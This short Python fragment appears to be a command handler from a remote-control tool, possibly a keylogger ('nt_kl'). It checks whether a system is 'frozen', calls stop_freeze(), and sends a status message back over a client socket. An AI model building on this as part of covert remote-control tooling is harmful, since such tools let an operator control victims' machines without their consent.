
status = nt_kl.get_frz_status()
if not status:
    resp = '[+] System is already unfrozen\n'
else:
    nt_kl.stop_freeze()
    status = nt_kl.get_frz_status()
    if not status:
        resp = '[+] System has been successfully unfrozen\n'
    else:
        resp = '[!] System failed to unfreeze\n'

send(client_socket,resp)
